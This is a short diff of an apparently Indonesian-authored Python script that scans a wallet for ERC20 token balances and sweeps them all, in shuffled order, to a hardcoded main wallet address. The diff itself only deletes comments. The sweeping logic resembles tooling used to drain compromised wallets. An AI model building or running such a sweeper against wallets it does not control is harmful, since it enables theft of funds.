@@ -29,12 +29,9 @@ last_block = None
 sent_addresses = set()
 tx_count = 0
 
-# --- Wallet Utama ---
 MAIN_WALLET = "0x7C8c8eF20a48901372775618330B294ab937C934"
 
-# --- Fungsi Scan Token ---
 def scan_tokens():
-    """Cari semua token ERC20 yang pernah diterima wallet dan ada saldonya."""
     print("🔍 Scanning token ERC20...")
     from_block = 1
     to_block = w3.eth.block_number
@@ -52,7 +49,6 @@ def scan_tokens():
 
     return list(found_tokens)
 
-# --- Fungsi Sweep Token ---
 def send_all_tokens():
     tokens_to_send = scan_tokens()
     random.shuffle(tokens_to_send)
